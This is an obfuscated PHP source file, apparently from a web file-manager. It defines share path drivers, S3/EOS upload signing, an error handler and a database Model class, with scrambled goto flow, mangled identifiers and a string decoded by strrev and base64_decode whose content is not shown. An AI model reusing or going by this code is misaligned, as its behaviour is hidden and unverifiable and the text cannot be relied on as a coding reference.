<?php
 goto f²ŸóÅ’”; dÊ‘ ¹é¿İ: class PathDriverDriverShareItem { public function __construct($cŒ‹£’Á¸ë) { $this->pathParse = $cŒ‹£’Á¸ë; } public function __call($a¥…ªØº‚ñ, $b‘Ò®•…¢×) { $f±Š¼ßíÎÆ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (method_exists($this, $a¥…ªØº‚ñ)) { return; } $dÙÓ¾–Ş‚­ = call_user_func_array(array($f±Š¼ßíÎÆ[1116], $a¥…ªØº‚ñ), $b‘Ò®•…¢×); $B×÷ˆ›Ùğá = array($f±Š¼ßíÎÆ[1117], $f±Š¼ßíÎÆ[1118], $f±Š¼ßíÎÆ[1119], $f±Š¼ßíÎÆ[1120], $f±Š¼ßíÎÆ[503], $f±Š¼ßíÎÆ[505], $f±Š¼ßíÎÆ[1121], $f±Š¼ßíÎÆ[115], $f±Š¼ßíÎÆ[1122], $f±Š¼ßíÎÆ[1123]); if (in_array($a¥…ªØº‚ñ, $B×÷ˆ›Ùğá)) { $dÙÓ¾–Ş‚­ = $this->getPathOuter($dÙÓ¾–Ş‚­); } return $dÙÓ¾–Ş‚­; } public function copy($d¼Ö²ô…”Á, $bƒÀƒ’…†, $E‘‚ï³°À¢ = false) { return $this->copyMove($d¼Ö²ô…”Á, $bƒÀƒ’…†, $E‘‚ï³°À¢, $_SERVER[¹÷ˆ§éÒ°ú][503]); } public function move($F—½¢êãâó, $dß¸ƒÊåò˜, $AŸè‰ä““ó = false) { return $this->copyMove($F—½¢êãâó, $dß¸ƒÊåò˜, $AŸè‰ä““ó, $_SERVER[¹÷ˆ§éÒ°ú][505]); } private function copyMove($e‰÷¬‰ÅøÀ, $BŠÑñóˆÑŞ, $D‡ˆâØÄ§, $e˜ï‘éëâ†) { goto E¤‘Ø˜÷ÍÎ; C’Ìä•¸²í: return $eËª‰ó”¸È; goto c‚÷–§áÊ; AÅ›ª‚¶£»: if ($AÀƒ®ç‹Ñ»->pathParse[$CÑÓ¢ÃÛé[989]]) { $BŠÑñóˆÑŞ = $AÀƒ®ç‹Ñ»->pathParse[$CÑÓ¢ÃÛé[989]]; } else { $BŠÑñóˆÑŞ = $A†¡‘ÍÜî¤; } $eËª‰ó”¸È = IO::copyMove($e‰÷¬‰ÅøÀ, $BŠÑñóˆÑŞ, $D‡ˆâØÄ§, $e˜ï‘éëâ†); $eËª‰ó”¸È = $this->getPathOuter($eËª‰ó”¸È); goto C’Ìä•¸²í; E¤‘Ø˜÷ÍÎ: $CÑÓ¢ÃÛé =& $_SERVER[¹÷ˆ§éÒ°ú]; $A†¡‘ÍÜî¤ = $BŠÑñóˆÑŞ; $AÀƒ®ç‹Ñ» = IO::driverMake($BŠÑñóˆÑŞ); goto AÅ›ª‚¶£»; c‚÷–§áÊ: } public function pathFather($FÎ×ºÃšÉ¯) { return get_path_father($this->pathParse[$_SERVER[¹÷ˆ§éÒ°ú][87]]); } public function iconvSystem($DÒ°ˆÏâ) { return $DÒ°ˆÏâ; } protected function infoParse($eÚ„Ç„‚ñ, $BïÉ±ÚŸ = false) { $C†©ƒóÂˆª =& $_SERVER[¹÷ˆ§éÒ°ú]; $E‹±óŞª© = $this->pathParse[$C†©ƒóÂˆª[450]][$C†©ƒóÂˆª[1010]] . $this->pathParse[$C†©ƒóÂˆª[1003]]; if ($BïÉ±ÚŸ) { $EÛ³âË¿¨ª = IO::infoWithChildren($E‹±óŞª©); } else { $EÛ³âË¿¨ª = IO::info($E‹±óŞª©); } $c–›µÄº½£ = $this->pathParse[$C†©ƒóÂˆª[450]]; return Action($C†©ƒóÂˆª[1115])->_shareItemeParse($EÛ³âË¿¨ª, $c–›µÄº½£); } public function listAll($cê´ğ¦Ï©) { $cÚÂÁĞóÍ =& $_SERVER[¹÷ˆ§éÒ°ú]; $BÆ”£”õ÷ = IO::listAll($cê´ğ¦Ï©); $fñóš±²Åä = $this->pathParse[$cÚÂÁĞóÍ[450]]; foreach ($BÆ”£”õ÷ as &$a…É†ŠËã) { check_abort(); $a…É†ŠËã = array_merge(IO::info($a…É†ŠËã[$cÚÂÁĞóÍ[87]]), $a…É†ŠËã); $a…É†ŠËã[$cÚÂÁĞóÍ[402]] = Action($cÚÂÁĞóÍ[1115])->_shareItemeParse($a…É†ŠËã, $fñóš±²Åä); } return $BÆ”£”õ÷; } public function getPathOuter($FáÇ²—šâ‚) { goto a×†×æ; a×†×æ: $aÊ¼ê…Æ¹ß =& $_SERVER[¹÷ˆ§éÒ°ú]; $AŞÌ‘ášŒõ = KodIO::parse($FáÇ²—šâ‚); if ($AŞÌ‘ášŒõ[$aÊ¼ê…Æ¹ß[39]] == KodIO::KOD_SHARE_ITEM) { return $AŞÌ‘ášŒõ[$aÊ¼ê…Æ¹ß[87]]; } goto FÈŒÒÅé•‹; d…“ôäÍ…Â: if (substr($E§ÁÄ¶ğã, 0, strlen($aºôÑÖ·ó)) != $aºôÑÖ·ó) { return !1; } return $this->pathParse[$aÊ¼ê…Æ¹ß[1004]] . $aÊ¼ê…Æ¹ß[18] . ltrim($e£ÎÎĞØ¿Ç, $aÊ¼ê…Æ¹ß[18]); goto eÖ‡²‚ŞÔ; FÈŒÒÅé•‹: $E§ÁÄ¶ğã = KodIO::clear($FáÇ²—šâ‚); $aºôÑÖ·ó = KodIO::clear($this->pathParse[$aÊ¼ê…Æ¹ß[450]][$aÊ¼ê…Æ¹ß[1010]]); $e£ÎÎĞØ¿Ç = substr($E§ÁÄ¶ğã, strlen($aºôÑÖ·ó)); goto d…“ôäÍ…Â; eÖ‡²‚ŞÔ: } public function getType() { $D¸×«µØ‹® =& $_SERVER[¹÷ˆ§éÒ°ú]; $føĞãò¯äê = str_replace($D¸×«µØ‹®[83], $D¸×«µØ‹®[43], get_class($this)); return strtolower($føĞãò¯äê); } public function isTypeObject($AŒâƒêİÂ¹) { return IO::isTypeObject($AŒâƒêİÂ¹); } public function info($cäŒÃÛŒ‹°) { return $this->infoParse($cäŒÃÛŒ‹°); } public function infoAuth($cÒÃµ í…) { return $this->infoParse($cÒÃµ í…); } public function infoWithChildren($bØˆ™ï•ÍÖ) { return $this->infoParse($bØˆ™ï•ÍÖ, !0); } public function infoFull($Dã¼‚“‰ß) { return $this->infoParse($Dã¼‚“‰ß); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($e‚½‘¡ å) { $this->pathParse = $e‚½‘¡ å; } protected function infoParse($BÉ–ÎˆĞ‚, $DÌ £ËÄ¹Î = false) { $aä„‡¦‘¾Ì =& $_SERVER[¹÷ˆ§éÒ°ú]; return Action($aä„‡¦‘¾Ì[1009])->sharePathInfo($this->pathParse[$aä„‡¦‘¾Ì[87]], !0, $DÌ £ËÄ¹Î); } public function listPath($F„„‚œÀ, $dùÙÖêÈé§ = false) { $eõ°²ƒ‚Ó‹ =& $_SERVER[¹÷ˆ§éÒ°ú]; $B®ƒöö®œ = IO::listPath($F„„‚œÀ, $dùÙÖêÈé§); foreach ($B®ƒöö®œ as $c¬‰Ã¢‚„µ => $dƒ£ÍÈ™×÷) { if (!in_array($c¬‰Ã¢‚„µ, array($eõ°²ƒ‚Ó‹[85], $eõ°²ƒ‚Ó‹[86]))) { continue; } foreach ($dƒ£ÍÈ™×÷ as $AäÆÒ‘ÎˆÇ => $Aâ¤œŒ†¯´) { $Aâ¤œŒ†¯´ = Action($eõ°²ƒ‚Ó‹[1124])->parsePathChildren($Aâ¤œŒ†¯´, array($eõ°²ƒ‚Ó‹[398] => $F„„‚œÀ)); $B®ƒöö®œ[$c¬‰Ã¢‚„µ][$AäÆÒ‘ÎˆÇ] = Action($eõ°²ƒ‚Ó‹[1009])->shareItemInfo($Aâ¤œŒ†¯´); } } return $B®ƒöö®œ; } public function listAll($BÏ‚‹Êà¥“) { $f…Òº÷Â÷… =& $_SERVER[¹÷ˆ§éÒ°ú]; $e‡ÜÖ¨Õ›ô = IO::listAll($BÏ‚‹Êà¥“); foreach ($e‡ÜÖ¨Õ›ô as &$D¯ùİ°Š¢) { $D¯ùİ°Š¢ = array_merge(IO::info($D¯ùİ°Š¢[$f…Òº÷Â÷…[87]]), $D¯ùİ°Š¢); $D¯ùİ°Š¢[$f…Òº÷Â÷…[402]] = Action($f…Òº÷Â÷…[1009])->shareItemInfo($D¯ùİ°Š¢); } return $e‡ÜÖ¨Õ›ô; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($añò­óŞÁœ) { parent::__construct($añò­óŞÁœ); $this->signatureVersion($_SERVER[¹÷ˆ§éÒ°ú][212]); } public function uploadFormData($DÕ†‹í¦¸„, $eïÑ‰ğğÇ£ = 3600) { goto B˜ã£é¯ã±; FôÚ¨ÍÕÜÌ: $D¼³’®Ù„ = hash_hmac($d–©ÆÌ«‡ [1135], $Bì‡âåäª, $dÑ³Î¶Ôß, !0); $aÇ§¦Ìğ« = hash_hmac($d–©ÆÌ«‡ [1135], $fÊ…Ã˜Î¡Ğ, $D¼³’®Ù„, !0); $F‹×Š‰» = hash_hmac($d–©ÆÌ«‡ [1135], $fÎ ™¶ªò¯, $aÇ§¦Ìğ«); goto fÃø£„ÃãÉ; fÃø£„ÃãÉ: $EÎÏâ•ÄÉˆ = array($d–©ÆÌ«‡ [211] => $d–©ÆÌ«‡ [43], $d–©ÆÌ«‡ [1137] => $d–©ÆÌ«‡ [43], $d–©ÆÌ«‡ [1095] => $e×ØÉÏ´—•, $d–©ÆÌ«‡ [1099] => $c›ÃŠø…‘÷, $d–©ÆÌ«‡ [1103] => $fÎ ™¶ªò¯, $d–©ÆÌ«‡ [1138] => $fßÎŒ†…‰ë, $d–©ÆÌ«‡ [1139] => $f©ë¸“ÄğŠ, $d–©ÆÌ«‡ [1140] => $CÑ“ÆßÄÛñ, $d–©ÆÌ«‡ [1141] => $B„±¦˜¾ã¸, $d–©ÆÌ«‡ [1142] => $F‹×Š‰», $d–©ÆÌ«‡ [181] => $this->getHost()); return $EÎÏâ•ÄÉˆ; goto AÁÒ²‡Î¶¬; DÁ´²ÜÂ­í: $DºÏŒ™‚öè = array($this->accessKey, $eÜğ¯ÈÄ¾®, $this->region, $Bì‡âåäª, $fÊ…Ã˜Î¡Ğ); $fßÎŒ†…‰ë = implode($d–©ÆÌ«‡ [18], $DºÏŒ™‚öè); $DÀƒØÖ‹¾Ö = array($d–©ÆÌ«‡ [1093] => gmdate($d–©ÆÌ«‡ [1092], strtotime($d–©ÆÌ«‡ [1128])), $d–©ÆÌ«‡ [1094] => array(array($d–©ÆÌ«‡ [1096] => $this->bucket), array($d–©ÆÌ«‡ [1095] => $e×ØÉÏ´—•), array($d–©ÆÌ«‡ [1097], $d–©ÆÌ«‡ [1098], $d–©ÆÌ«‡ [43]), array($d–©ÆÌ«‡ [1097], $d–©ÆÌ«‡ [1129], $d–©ÆÌ«‡ [43]), array($d–©ÆÌ«‡ [1097], $d–©ÆÌ«‡ [1130], $d–©ÆÌ«‡ [43]), array($d–©ÆÌ«‡ [1099] => $c›ÃŠø…‘÷), array($d–©ÆÌ«‡ [1131] => $fßÎŒ†…‰ë), array($d–©ÆÌ«‡ [1132] => $f©ë¸“ÄğŠ), array($d–©ÆÌ«‡ [1133] => $CÑ“ÆßÄÛñ), array($d–©ÆÌ«‡ [1134] => $B„±¦˜¾ã¸))); goto F•ŞãÓ³‰; B˜ã£é¯ã±: $d–©ÆÌ«‡  =& $_SERVER[¹÷ˆ§éÒ°ú]; $e×ØÉÏ´—• = $d–©ÆÌ«‡ [197]; $f©ë¸“ÄğŠ = $d–©ÆÌ«‡ [1125]; goto Bë’æÏÌ¥‹; Bë’æÏÌ¥‹: $Bì‡âåäª = $d–©ÆÌ«‡ [71]; $CÑ“ÆßÄÛñ = gmdate($d–©ÆÌ«‡ [1126]); $eÜğ¯ÈÄ¾® = gmdate($d–©ÆÌ«‡ [685]); goto cŒŒÅñÓ½ñ; cŒŒÅñÓ½ñ: $fÊ…Ã˜Î¡Ğ = $d–©ÆÌ«‡ [1127]; $B„±¦˜¾ã¸ = $eïÑ‰ğğÇ£ . $d–©ÆÌ«‡ [43]; $c›ÃŠø…‘÷ = $d–©ÆÌ«‡ [1091]; goto DÁ´²ÜÂ­í; F•ŞãÓ³‰: $fÎ ™¶ªò¯ = base64_encode(json_encode($DÀƒØÖ‹¾Ö)); $Aâ‹Î¿¼À• = hash_hmac($d–©ÆÌ«‡ [1135], $eÜğ¯ÈÄ¾®, $d–©ÆÌ«‡ [1136] . $this->secret, !0); $dÑ³Î¶Ôß = hash_hmac($d–©ÆÌ«‡ [1135], $this->region, $Aâ‹Î¿¼À•, !0); goto FôÚ¨ÍÕÜÌ; AÁÒ²‡Î¶¬: } } goto C¸’ÕÒŒ–Í; d‡éÌø‹: function beforeShutdownError($aœåï½å = false, $A²ïœÎÅ”Ä = '', $a›™Äõ‘°ö = '', $A±ííÏ”š§ = 0) { $eµ¸ÙŒõ£‡ =& $_SERVER[Œá²]; switch ($aœåï½å) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $Dá¸Ú É— = $eµ¸ÙŒõ£‡[35]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $Dá¸Ú É— = $eµ¸ÙŒõ£‡[36]; break; case E_STRICT: $Dá¸Ú É— = $eµ¸ÙŒõ£‡[37]; break; case E_NOTICE: case E_USER_NOTICE: $Dá¸Ú É— = $eµ¸ÙŒõ£‡[38]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $Dá¸Ú É— = $eµ¸ÙŒõ£‡[39]; break; default: break; } if (!$Dá¸Ú É— || $Dá¸Ú É— == $eµ¸ÙŒõ£‡[38] || $Dá¸Ú É— == $eµ¸ÙŒõ£‡[39]) { return; } $a›™Äõ‘°ö = $eµ¸ÙŒõ£‡[4] . str_replace($_SERVER[$eµ¸ÙŒõ£‡[33]], $eµ¸ÙŒõ£‡[16], $a›™Äõ‘°ö); $cÖç¹‚ãŠ¶ = $Dá¸Ú É— . $eµ¸ÙŒõ£‡[40] . $A²ïœÎÅ”Ä . $eµ¸ÙŒõ£‡[40] . $a›™Äõ‘°ö . $eµ¸ÙŒõ£‡[40] . $A±ííÏ”š§; write_log($cÖç¹‚ãŠ¶ . $eµ¸ÙŒõ£‡[41] . get_caller_msg(1), $eµ¸ÙŒõ£‡[15]); } $_SERVER[$_SERVER[Œá²][42]] = $_SERVER[$_SERVER[Œá²][33]] . $_SERVER[Œá²][43]; $f¤Ì–¶‡¶ = strrev(base64_decode($_SERVER[Œá²][44])); goto e‹¢¦‰ö»; d„Ñ–ÚåîÕ: register_shutdown_function($_SERVER[Œá²][32]); set_error_handler($_SERVER[Œá²][46], $Fö®Ëò’šÏ); if (function_exists($_SERVER[Œá²][47])) { set_exception_handler($_SERVER[Œá²][48]); } goto Aµ¦©†İ¦; eç¸íÃÅÂˆ: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\142\x6c\145", "\x6f\x72\x64\145\x72", "\141\154\151\x61\x73", "\150\x61\166\151\x6e\147", "\x67\162\x6f\x75\x70", "\x6c\157\x63\x6b", "\x64\x69\x73\x74\151\x6e\x63\x74", "\141\165\164\157", "\146\151\x6c\164\x65\162", "\x76\x61\x6c\151\144\x61\164\x65", "\x72\x65\163\165\x6c\164", "\x62\151\x6e\x64", "\164\157\x6b\145\156"); public function __construct($C©ŠÃ–ñŒ² = '', $b¸×ßá¥Æ¸ = '', $EÖŞª‰¤®± = '') { $eÚÕí¶ê—Š =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->_initialize(); if (!empty($C©ŠÃ–ñŒ²)) { if (strpos($C©ŠÃ–ñŒ², $eÚÕí¶ê—Š[103])) { list($this->dbName, $this->name) = explode($eÚÕí¶ê—Š[103], $C©ŠÃ–ñŒ²); } else { $this->name = $C©ŠÃ–ñŒ²; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($b¸×ßá¥Æ¸)) { $this->tablePrefix = $eÚÕí¶ê—Š[43]; } elseif ($eÚÕí¶ê—Š[43] != $b¸×ßá¥Æ¸) { $this->tablePrefix = $b¸×ßá¥Æ¸; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($eÚÕí¶ê—Š[243]); } $this->db(0, empty($this->connection) ? $EÖŞª‰¤®± : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Eäµ…˜È¶¬ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (empty($this->fields)) { if (think_config($Eäµ…˜È¶¬[244])) { $CãïÌš¾ƒ = $this->dbName ? $this->dbName : think_config($Eäµ…˜È¶¬[245]); $B¬ŠÖ“¾·² = think_var_cache($Eäµ…˜È¶¬[246] . strtolower(get_path_this($CãïÌš¾ƒ) . $Eäµ…˜È¶¬[103] . $this->name)); if ($B¬ŠÖ“¾·²) { $Cã‹ö·„Ğ¼ = think_config($Eäµ…˜È¶¬[247]); if (empty($Cã‹ö·„Ğ¼) || $B¬ŠÖ“¾·²[$Eäµ…˜È¶¬[248]] == $Cã‹ö·„Ğ¼) { $this->fields = $B¬ŠÖ“¾·²; return; } } } $this->flush(); } } public function flush() { goto c ¢÷¸¤Ş; C˜Á¯‹Œ†é: if (think_config($D…‘Ò‹™‡®[244])) { $fÆ˜¶¥¨‘ = $this->dbName ? $this->dbName : think_config($D…‘Ò‹™‡®[245]); think_var_cache($D…‘Ò‹™‡®[246] . strtolower(get_path_this($fÆ˜¶¥¨‘) . $D…‘Ò‹™‡®[103] . $this->name), $this->fields); } goto dÚ…œÜÛ³å; cƒÂÛÔÉÖÎ: if (!$DØ·õ·Úİ˜) { return !1; } $this->fields = array_keys($DØ·õ·Úİ˜); $this->fields[$D…‘Ò‹™‡®[249]] = !1; goto bîÍÉ¯ƒÛ; bîÍÉ¯ƒÛ: foreach ($DØ·õ·Úİ˜ as $Fª¸Ìçê“ => $F”£ê“ŞÒÎ) { $D³ÑÅŠÌ«[$Fª¸Ìçê“] = $F”£ê“ŞÒÎ[$D…‘Ò‹™‡®[39]]; if ($F”£ê“ŞÒÎ[$D…‘Ò‹™‡®[46]]) { $this->fields[$D…‘Ò‹™‡®[250]] = $Fª¸Ìçê“; if ($F”£ê“ŞÒÎ[$D…‘Ò‹™‡®[49]]) { $this->fields[$D…‘Ò‹™‡®[249]] = !0; } } } $this->fields[$D…‘Ò‹™‡®[251]] = $D³ÑÅŠÌ«; if (think_config($D…‘Ò‹™‡®[247])) { $this->fields[$D…‘Ò‹™‡®[248]] = think_config($D…‘Ò‹™‡®[247]); } goto C˜Á¯‹Œ†é; c ¢÷¸¤Ş: $D…‘Ò‹™‡® =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->db->setModel($this->name); $DØ·õ·Úİ˜ = $this->db->getFields($this->getTableName()); goto cƒÂÛÔÉÖÎ; dÚ…œÜÛ³å: } public function switchModel($aé–ÒãšÂ˜, $Aùß‚‹æ İ = array()) { $D¡Áê‡‘ =& $_SERVER[¹÷ˆ§éÒ°ú]; $d‡ÌÎ©ÍÂÇ = ucwords(strtolower($aé–ÒãšÂ˜)) . $D¡Áê‡‘[252]; if (!class_exists($d‡ÌÎ©ÍÂÇ)) { think_exception($d‡ÌÎ©ÍÂÇ . think_lang($D¡Áê‡‘[253])); } $this->_extModel = new $d‡ÌÎ©ÍÂÇ($this->name); if (!empty($Aùß‚‹æ İ)) { foreach ($Aùß‚‹æ İ as $FÀ‘¡àå‡Ò) { $this->_extModel->setProperty($FÀ‘¡àå‡Ò, $this->{$FÀ‘¡àå‡Ò}); } } return $this->_extModel; } public function __set($F¨øçÂÂâ, $e›¸©¶ïóÚ) { $this->data[$F¨øçÂÂâ] = $e›¸©¶ïóÚ; } public function __get($fªÌƒŞ†‡“) { return isset($this->data[$fªÌƒŞ†‡“]) ? $this->data[$fªÌƒŞ†‡“] : null; } public function __isset($B¤«¾Ğ”ÔÜ) { return isset($this->data[$B¤«¾Ğ”ÔÜ]); } public function __unset($aäƒŸùôó) { unset($this->data[$aäƒŸùôó]); } public function __call($dÃğ‚áŠ–Ì, $Cµ”°™®÷ã) { $Aù›¿ì„¼ø =& $_SERVER[¹÷ˆ§éÒ°ú]; if (in_array(strtolower($dÃğ‚áŠ–Ì), $this->methods, !0)) { $this->options[strtolower($dÃğ‚áŠ–Ì)] = $Cµ”°™®÷ã[0]; return $this; } elseif (in_array(strtolower($dÃğ‚áŠ–Ì), array($Aù›¿ì„¼ø[254], $Aù›¿ì„¼ø[255], $Aù›¿ì„¼ø[256], $Aù›¿ì„¼ø[257], $Aù›¿ì„¼ø[258]), !0)) { $c³Ø¨ÎÄèµ = isset($Cµ”°™®÷ã[0]) ? $Cµ”°™®÷ã[0] : $Aù›¿ì„¼ø[188]; $c³Ø¨ÎÄèµ = $this->db->parseKey($c³Ø¨ÎÄèµ); return $this->getField(strtoupper($dÃğ‚áŠ–Ì) . $Aù›¿ì„¼ø[259] . $c³Ø¨ÎÄèµ . $Aù›¿ì„¼ø[260] . $dÃğ‚áŠ–Ì, $Aù›¿ì„¼ø[254]); } elseif (strtolower(substr($dÃğ‚áŠ–Ì, 0, 5)) == $Aù›¿ì„¼ø[261]) { $c³Ø¨ÎÄèµ = think_parse_name(substr($dÃğ‚áŠ–Ì, 5)); $eÆêË§š[$c³Ø¨ÎÄèµ] = $Cµ”°™®÷ã[0]; return $this->where($eÆêË§š)->find(); } elseif (strtolower(substr($dÃğ‚áŠ–Ì, 0, 10)) == $Aù›¿ì„¼ø[262]) { $bÚİ…ç‡Ğ = think_parse_name(substr($dÃğ‚áŠ–Ì, 10)); $eÆêË§š[$bÚİ…ç‡Ğ] = $Cµ”°™®÷ã[0]; return $this->where($eÆêË§š)->getField($Cµ”°™®÷ã[1]); } elseif (isset($this->_scope[$dÃğ‚áŠ–Ì])) { return $this->scope($dÃğ‚áŠ–Ì, $Cµ”°™®÷ã[0]); } elseif (method_exists($this, $dÃğ‚áŠ–Ì)) { array_unshift($Cµ”°™®÷ã, $dÃğ‚áŠ–Ì); return call_user_func_array(array($this, $Aù›¿ì„¼ø[263]), $Cµ”°™®÷ã); } else { return call_user_func_array(array(parent, $dÃğ‚áŠ–Ì), $Cµ”°™®÷ã); } } protected function call() { goto fîËóÎ‘ÚÃ; C‹œ¹ŸÎŒŠ: $f‹š”ÌÉÅ¢ = $CñœÚ»˜ Ä; if (is_array($CñœÚ»˜ Ä)) { $f‹š”ÌÉÅ¢ = $CñœÚ»˜ Ä[1]; $CñœÚ»˜ Ä = $CñœÚ»˜ Ä[0]; } $aÚ–”æàçÏ = count($a ½Õ…Ãƒæ) - 1; goto bØÊÄ¡ùÎ‘; bØÊÄ¡ùÎ‘: if (isset($a ½Õ…Ãƒæ[$aÚ–”æàçÏ]) && $a ½Õ…Ãƒæ[$aÚ–”æàçÏ] === $CñœÚ»˜ Ä) { think_exception(__CLASS__ . $C†¾›š¾‹Œ[14] . $CñœÚ»˜ Ä . think_lang($C†¾›š¾‹Œ[264])); return; } $a ½Õ…Ãƒæ[] = $CñœÚ»˜ Ä; if (method_exists($this, $C†¾›š¾‹Œ[265])) { $Câ­ ¿ï¼ = call_user_func_array(array($this, $C†¾›š¾‹Œ[266]), array($f‹š”ÌÉÅ¢, $a ½Õ…Ãƒæ)); if (!is_null($Câ­ ¿ï¼) && $Câ­ ¿ï¼ !== !1) { return $Câ­ ¿ï¼; } } goto B˜áÕ®éáæ; B˜áÕ®éáæ: $d¥Î»ùß¬ø = call_user_func_array(array($this, $CñœÚ»˜ Ä), $a ½Õ…Ãƒæ); if (method_exists($this, $C†¾›š¾‹Œ[267])) { $Câ­ ¿ï¼ = call_user_func_array(array($this, $C†¾›š¾‹Œ[268]), array($f‹š”ÌÉÅ¢, $a ½Õ…Ãƒæ, $d¥Î»ùß¬ø)); if ($Câ­ ¿ï¼) { return $Câ­ ¿ï¼; } } return $d¥Î»ùß¬ø; goto d¥¿ä„¦; fîËóÎ‘ÚÃ: $C†¾›š¾‹Œ =& $_SERVER[¹÷ˆ§éÒ°ú]; $a ½Õ…Ãƒæ = func_get_args(); $CñœÚ»˜ Ä = array_shift($a ½Õ…Ãƒæ); goto C‹œ¹ŸÎŒŠ; d¥¿ä„¦: } protected function _initialize() { } protected function _facade($CÀõÈ–¯†ã) { $CßÔ•îâÌ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!empty($this->fields)) { foreach ($CÀõÈ–¯†ã as $e¾ãöÈ‰Ã => $E¸Êê‘å¬µ) { if (!in_array($e¾ãöÈ‰Ã, $this->fields, !0)) { unset($CÀõÈ–¯†ã[$e¾ãöÈ‰Ã]); } elseif (is_scalar($E¸Êê‘å¬µ)) { $this->_parseType($CÀõÈ–¯†ã, $e¾ãöÈ‰Ã); } } } if (!empty($this->options[$CßÔ•îâÌ[269]])) { $CÀõÈ–¯†ã = array_map($this->options[$CßÔ•îâÌ[269]], $CÀõÈ–¯†ã); unset($this->options[$CßÔ•îâÌ[269]]); } $this->_beforeWrite($CÀõÈ–¯†ã); return $CÀõÈ–¯†ã; } protected function _beforeWrite(&$fÆ÷Ô‘ŒœÚ) { } public function add($a‡÷•á‚Ö = '', $e‰©³¢¿çÅ = array(), $c˜õÊğ‰²© = false) { goto cøÔ¥î”‚¶; A‡™¼³èÍê: if (!1 === $this->_beforeInsert($a‡÷•á‚Ö, $e‰©³¢¿çÅ)) { return !1; } $a‚‰®¿ŞÑº = $this->db->insert($a‡÷•á‚Ö, $e‰©³¢¿çÅ, $c˜õÊğ‰²©); if (!1 !== $a‚‰®¿ŞÑº) { $c¦×§±¡‡§ = $this->getLastInsID(); if ($c¦×§±¡‡§) { $a‡÷•á‚Ö[$this->getPk()] = $c¦×§±¡‡§; $this->_after_insert($a‡÷•á‚Ö, $e‰©³¢¿çÅ); return $c¦×§±¡‡§; } $this->_after_insert($a‡÷•á‚Ö, $e‰©³¢¿çÅ); } goto eØ˜ù”Â‹â; cøÔ¥î”‚¶: if (empty($a‡÷•á‚Ö)) { if (!empty($this->data)) { $a‡÷•á‚Ö = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¹÷ˆ§éÒ°ú][270]); return !1; } } $e‰©³¢¿çÅ = $this->_parseOptions($e‰©³¢¿çÅ); $a‡÷•á‚Ö = $this->_facade($a‡÷•á‚Ö); goto A‡™¼³èÍê; eØ˜ù”Â‹â: return $a‚‰®¿ŞÑº; goto AÜä¥Œã»å; AÜä¥Œã»å: } protected function _beforeInsert(&$Aù‘â…»ä, $DÄ‚ï ¨) { } protected function _after_insert($cŠ‰Ş¡¾—È, $aÚœõôŞ“È) { } public function addAll($báÜœ¬Ş“å, $Cœ»òæ‹Ñ¦ = array(), $d½ªÇ §… = false) { goto EÅ® ƒºšÙ; EÅ® ƒºšÙ: $aŸ™ ª¤š =& $_SERVER[¹÷ˆ§éÒ°ú]; if (empty($báÜœ¬Ş“å)) { $this->error = think_lang($aŸ™ ª¤š[270]); return !1; } $Cœ»òæ‹Ñ¦ = $this->_parseOptions($Cœ»òæ‹Ñ¦); goto Bë²ÉÕ«Ş; E®ô‘¼™: return $E·¢·à¶Ë; goto CÜ¯¹Âá‚ç; Bë²ÉÕ«Ş: foreach ($báÜœ¬Ş“å as $fË¤®Œ => $Eàà÷…­Ÿ¾) { $báÜœ¬Ş“å[$fË¤®Œ] = $this->_facade($Eàà÷…­Ÿ¾); } if (method_exists($this->db, $aŸ™ ª¤š[271])) { $E·¢·à¶Ë = $this->db->insertAll($báÜœ¬Ş“å, $Cœ»òæ‹Ñ¦, $d½ªÇ §…); } else { $this->startTrans(); foreach ($báÜœ¬Ş“å as $fË¤®Œ => $Eàà÷…­Ÿ¾) { $E·¢·à¶Ë = $this->db->insert($Eàà÷…­Ÿ¾, $Cœ»òæ‹Ñ¦, $d½ªÇ §…); } $this->commit(); } if (!1 !== $E·¢·à¶Ë) { $Fìø¦»— = $this->getLastInsID(); if ($Fìø¦»—) { return $Fìø¦»—; } } goto E®ô‘¼™; CÜ¯¹Âá‚ç: } public function selectAdd($dô¢‡öóá‘ = '', $eÏñ²·Òà = '', $fŞ±‚êÓ¢í = array()) { $B‘±ô±µ”Ñ =& $_SERVER[¹÷ˆ§éÒ°ú]; $fŞ±‚êÓ¢í = $this->_parseOptions($fŞ±‚êÓ¢í); if (!1 === ($a‡§“²‡¼î = $this->db->selectInsert($dô¢‡öóá‘ ? $dô¢‡öóá‘ : $fŞ±‚êÓ¢í[$B‘±ô±µ”Ñ[272]], $eÏñ²·Òà ? $eÏñ²·Òà : $this->getTableName(), $fŞ±‚êÓ¢í))) { $this->error = think_lang($B‘±ô±µ”Ñ[273]); return !1; } else { return $a‡§“²‡¼î; } } public function save($aÕù¡ß¯œÙ = '', $eÎÉ¾©ğ¥ = array()) { goto Eš“Ç‹Èö; bæµ¶Å©›: if (!1 !== $d‹™ĞïÓ™ ) { if (isset($bäæ¡à‘‘)) { $aÕù¡ß¯œÙ[$eÆêˆ˜ÒÄš] = $bäæ¡à‘‘; } $this->_afterUpdate($aÕù¡ß¯œÙ, $eÎÉ¾©ğ¥); } return $d‹™ĞïÓ™ ; goto bÃËá‚÷¸; b‘’§¼Î›¨: if (is_array($eÎÉ¾©ğ¥[$BÙòİÖØ°‹[274]]) && 